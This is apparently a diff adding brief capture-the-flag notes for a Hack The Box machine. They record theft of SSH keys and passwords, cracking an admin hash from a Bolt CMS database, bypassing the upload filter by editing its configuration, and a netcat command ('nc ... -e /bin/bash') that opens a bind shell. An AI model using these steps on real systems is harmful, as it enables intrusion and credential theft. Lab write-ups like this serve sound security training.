@@ -1,0 +1,12 @@
+- etc has a ssh script with bolt's ssh password
+- grabbed his id_rsa from root/id_rsa and logged in
+- password is GkOcz221Ftb3ugog
+- ssl certs in ./etc/ssl/certs/ca-certificates.crt
+- found a login at http://registry.htb/bolt/bolt
+- bolt user had db creds for the bolt website in /var/www/html/bolt/app/database/bolt.db
+- whipped out python and found a hash in bolt_users table for username admin
+- cracked the hash and got password strawberry
+- bolt had a file upload service and php could be executed but wasnt allowed to be uploaded
+- add php in main configuration and saving bypassed this
+- reverse shell was not working but bind shell was so uploaded php_bind.php and ran nc 10.10.10.159 4444 -e /bin/bash to get shell as www-data
+- www-data had a sudo -l entry for sudo restic
